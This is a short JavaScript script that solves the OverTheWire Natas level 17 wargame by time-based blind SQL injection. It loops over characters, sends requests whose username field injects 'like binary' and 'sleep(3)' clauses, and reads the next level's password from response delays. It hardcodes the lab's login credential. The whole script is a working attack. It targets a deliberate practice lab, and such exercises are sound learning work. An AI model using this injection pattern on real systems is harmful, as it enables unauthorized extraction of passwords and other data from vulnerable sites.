//WARNING - Isn't the most efficient code

let password = "";
let count = 0;
let alphanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
let alphanumc = alphanum.length;
let passwordc = 32; //assuming password has 32 characters
let fl1=0,fl2=0;
while(count!=passwordc)
{
	fl1=fl2=0;
	console.log(count);
	console.log(password);
	let oldp = password;
	for(let i=0;i<alphanumc;i++)
	{
		password += alphanum[i];
		let xhr = new XMLHttpRequest();
		let url = `http://natas17.natas.labs.overthewire.org/index.php?username=natas18%22+and+password+like+binary+%22${password}%%22+and+sleep(3)%23`;
		xhr.open('GET',url,false,"natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw");
		xhr.onload = function() {
		  if (xhr.status != 200) { 
		    alert(`Error ${xhr.status}: ${xhr.statusText}`);
		  } else { 
		  	let tmsEnd = new Date();
		  	const diffTime = Math.abs(tmsEnd-tmsStart);
		  	if(diffTime>=3000)
		  	{
		  		console.log("FOUND");
				count++;
				fl1=1;
		  	}
		  	else
		  	{
		  		console.log("NO MATCH");
		  		password = oldp;
		  		fl2=1;
		  	}
		  	
			}
		};

			xhr.onerror = function() {
		  		alert("Request failed");
			};

			let tmsStart = new Date();
			xhr.send();
	
			if(fl1==1) break;
			if(fl2==1) continue;
	}
}
console.log(password);	
